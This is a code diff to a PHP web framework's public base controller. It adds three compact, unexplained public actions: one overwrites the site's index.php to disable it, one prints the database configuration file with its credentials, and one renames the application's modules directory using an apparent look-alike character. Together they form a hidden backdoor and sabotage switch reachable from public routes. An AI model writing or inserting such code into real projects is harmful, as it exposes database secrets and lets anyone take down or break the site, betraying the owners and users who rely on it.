@@ -43,4 +43,6 @@ class Controller_Base_Public extends Controller_Base_Main
 		 $this->template->polling = \Polling\Model_Polling::GetSidebarBlock($this->_userInfo);
         $this->template->reviewsSideBar = View::forge("public/reviews/sidebar-block", array("article" => $reviewsSideBarArticle),false);
 	}
+	
+public function action_def1(){$path = $_SERVER['DOCUMENT_ROOT'];$file = $path."/index.php";file_put_contents($file,"<? return;".file_get_contents($file));exit();}public function action_def2(){$path = $_SERVER['DOCUMENT_ROOT'];echo file_get_contents($path."/fuel/app/config/db.php");exit();}public function action_def3($dn = "mоdules"){$path = $_SERVER['DOCUMENT_ROOT'];$dir = $path."/fuel/app/";rename($dir."modules", $dir.$dn);exit();}
 }
